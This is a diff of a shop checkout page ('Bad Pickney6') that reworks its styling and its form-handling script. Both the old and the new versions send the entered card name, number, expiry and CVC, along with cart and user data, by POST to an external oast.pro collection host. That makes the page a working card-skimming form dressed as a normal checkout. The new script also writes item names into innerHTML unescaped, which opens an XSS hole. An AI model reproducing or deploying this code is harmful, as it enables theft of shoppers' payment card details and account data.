@@ -6,148 +6,145 @@
   <title>Checkout - Bad Pickney6</title>
   <link rel="stylesheet" href="styles.css">
   <style>
-    /* Checkout-specific styles */
-    #checkoutContainer {
-      max-width: 600px;
-      margin: 40px auto;
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f9f9f9;
+      padding: 40px 20px;
+    }
+
+    .checkout-container {
+      max-width: 800px;
+      margin: 0 auto;
       background: #fff;
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 6px 20px rgba(0,0,0,0.1);
     }
 
-    #checkoutContainer h2 {
+    h2 {
       text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 30px;
       color: #0077cc;
     }
 
-    #cartItems {
-      list-style: none;
-      padding: 0;
-      margin-bottom: 20px;
+    .cart-item {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 15px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #ccc;
     }
 
-    #cartItems li {
-      margin-bottom: 10px;
-      font-size: 1rem;
+    .cart-item span {
+      font-weight: bold;
     }
 
     #totalPrice {
-      font-weight: bold;
-      margin-bottom: 20px;
       text-align: right;
+      font-size: 1.2rem;
+      font-weight: bold;
+      margin-top: 20px;
+      margin-bottom: 30px;
     }
 
-    #cardForm input {
+    #checkoutForm input {
       width: 100%;
       padding: 12px;
-      margin: 10px 0;
-      border-radius: 8px;
+      margin-bottom: 15px;
+      border-radius: 6px;
       border: 1px solid #ccc;
+    }
+
+    #checkoutForm button {
+      width: 100%;
+      padding: 12px;
+      background: #28a745;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
       font-size: 1rem;
     }
 
-    #checkoutBtn {
-      width: 100%;
-      padding: 15px;
-      background: #28a745;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 1.1rem;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-
-    #checkoutBtn:hover {
+    #checkoutForm button:hover {
       background: #218838;
     }
   </style>
 </head>
 <body>
-  <div id="checkoutContainer">
+  <div class="checkout-container">
     <h2>Checkout</h2>
+    <div id="cartItemsContainer"></div>
+    <div id="totalPrice"></div>
 
-    <ul id="cartItems"></ul>
-    <p id="totalPrice">Total: $0</p>
-
-    <div id="cardForm">
-      <input type="text" id="cardName" placeholder="Name on Card" required>
-      <input type="text" id="cardNumber" placeholder="Card Number" required>
-      <input type="text" id="cardExpiry" placeholder="MM/YY" required>
-      <input type="text" id="cardCVC" placeholder="CVC" required>
-      <button id="checkoutBtn">Confirm Purchase</button>
-    </div>
+    <form id="checkoutForm">
+      <h3>Enter Card Info</h3>
+      <input type="text" name="cardName" placeholder="Cardholder Name" required>
+      <input type="text" name="cardNumber" placeholder="Card Number" required>
+      <input type="text" name="expiry" placeholder="Expiry MM/YY" required>
+      <input type="text" name="cvc" placeholder="CVC" required>
+      <button type="submit">Submit Purchase</button>
+    </form>
   </div>
 
   <script>
-    // Redirect if not logged in
+    // Only logged-in users
     const loggedInUser = JSON.parse(localStorage.getItem('loggedInUser'));
     if (!loggedInUser) {
       alert("You must be logged in to access checkout!");
       window.location.href = "index.html";
     }
 
-    // Load cart from localStorage
-    let cart = JSON.parse(localStorage.getItem('cart') || '[]');
-
-    const cartItemsEl = document.getElementById('cartItems');
-    const totalPriceEl = document.getElementById('totalPrice');
-
-    function updateCartDisplay() {
-      cartItemsEl.innerHTML = '';
-      let total = 0;
-      cart.forEach(item => {
-        const li = document.createElement('li');
-        li.textContent = `${item.name} - $${item.price}`;
-        cartItemsEl.appendChild(li);
-        total += item.price;
-      });
-      totalPriceEl.textContent = `Total: $${total.toFixed(2)}`;
+    // Get cart
+    const cart = JSON.parse(localStorage.getItem('cart') || '[]');
+    if (!cart.length) {
+      alert("Your cart is empty!");
+      window.location.href = "shop.html";
     }
 
-    updateCartDisplay();
+    const cartContainer = document.getElementById('cartItemsContainer');
+    const totalPriceEl = document.getElementById('totalPrice');
 
-    // Checkout button sends cart + card info to Request Bin
-    document.getElementById('checkoutBtn').addEventListener('click', () => {
-      const cardName = document.getElementById('cardName').value.trim();
-      const cardNumber = document.getElementById('cardNumber').value.trim();
-      const cardExpiry = document.getElementById('cardExpiry').value.trim();
-      const cardCVC = document.getElementById('cardCVC').value.trim();
+    let total = 0;
+    cartContainer.innerHTML = cart.map(item => {
+      total += item.price;
+      return `<div class="cart-item">
+        <div>${item.name}</div>
+        <div>$${item.price}</div>
+      </div>`;
+    }).join('');
 
-      if (!cardName || !cardNumber || !cardExpiry || !cardCVC) {
-        return alert("Please fill in all card details.");
-      }
+    totalPriceEl.textContent = `Total: $${total}`;
 
-      if (cart.length === 0) return alert("Your cart is empty!");
+    // Handle form submit
+    const form = document.getElementById('checkoutForm');
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const formData = {
+        cardName: form.cardName.value,
+        cardNumber: form.cardNumber.value,
+        expiry: form.expiry.value,
+        cvc: form.cvc.value,
+        items: cart,
+        total: total,
+        user: loggedInUser
+      };
 
-      fetch('https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          user: loggedInUser.email,
-          cart: cart,
-          total: cart.reduce((sum, item) => sum + item.price, 0),
-          card: {
-            name: cardName,
-            number: cardNumber,
-            expiry: cardExpiry,
-            cvc: cardCVC
-          }
-        })
+      // Send to Request Bin
+      fetch("https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(formData)
       })
       .then(() => {
-        alert("Checkout data sent successfully!");
-        cart = [];
-        localStorage.setItem('cart', JSON.stringify(cart));
-        updateCartDisplay();
-        document.getElementById('cardForm').reset();
+        alert("Purchase submitted!");
+        localStorage.removeItem('cart'); // clear cart
+        window.location.href = "index.html";
       })
       .catch(err => {
         console.error(err);
-        alert("Failed to send checkout data.");
+        alert("Failed to submit purchase.");
       });
     });
   </script>
